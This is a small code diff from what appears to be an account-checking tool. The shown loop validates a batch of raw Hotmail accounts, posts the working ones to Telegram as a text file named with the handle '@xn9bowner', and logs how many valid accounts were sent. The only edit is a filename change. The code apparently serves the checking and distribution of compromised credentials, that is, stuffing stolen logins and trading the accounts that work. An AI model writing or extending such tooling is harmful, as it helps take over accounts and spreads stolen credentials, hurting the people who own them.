@@ -707,7 +707,7 @@ async def monitor_loop():
                                     try:
                                         valid_accounts = await run_validity_checker(all_raw)
                                         if valid_accounts:
-                                            valid_fname = f"hotmail {len(valid_accounts)} by @xn9bowner.txt"
+                                            valid_fname = f"hotmail {len(valid_accounts)} valid by @xn9bowner.txt"
                                             await send_telegram_file(tg_header + "\n".join(valid_accounts), valid_fname)
                                             log.info(f"Posted {len(valid_accounts)} valid hotmail accounts")
                                         else:
